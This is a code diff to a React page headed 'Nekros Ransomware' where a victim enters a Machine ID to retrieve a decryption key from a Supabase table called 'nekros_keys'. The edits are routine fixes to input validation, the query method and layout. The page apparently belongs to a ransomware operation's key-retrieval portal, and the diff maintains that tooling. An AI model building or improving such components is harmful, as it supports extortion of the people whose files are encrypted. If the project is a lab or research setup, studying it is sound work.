@@ -1,7 +1,7 @@
 "use client";
 
 import { useState } from 'react';
-import { supabase } from '../lib/supabaseClient';
+import { supabase } from '@/lib/supabaseClient';
 
 export default function Home() {
   const [machineId, setMachineId] = useState('');
@@ -10,10 +10,11 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
 
   const handleGetKey = async () => {
-    if (!machineId) {
+    if (!machineId.trim()) {
       setError('Please enter a Machine ID.');
       return;
     }
+
     setLoading(true);
     setError('');
     setDecryptionKey('');
@@ -23,13 +24,13 @@ export default function Home() {
         .from('nekros_keys')
         .select('decrypt_key')
         .eq('software_key', machineId)
-        .single();
+        .maybeSingle(); // better than `.single()` to avoid errors if no match
 
       if (error) {
         throw error;
       }
 
-      if (data) {
+      if (data && data.decrypt_key) {
         setDecryptionKey(data.decrypt_key);
       } else {
         setError('No decryption key found for this Machine ID.');
@@ -42,8 +43,8 @@ export default function Home() {
   };
 
   return (
-    <main className="flex min-h-screen flex-col items-center justify-center p-24 bg-gray-900 text-white">
-      <div className="w-full max-w-md p-8 space-y-6 bg-gray-800 rounded-lg shadow-lg">
+    <main className="flex min-h-screen flex-col items-center justify-center p-6 bg-gray-900 text-white">
+      <div className="w-full max-w-md p-6 space-y-6 bg-gray-800 rounded-lg shadow-lg">
         <h1 className="text-3xl font-bold text-center text-red-500">Nekros Ransomware</h1>
         <p className="text-center text-gray-400">
           Enter your Machine ID to retrieve your decryption key.
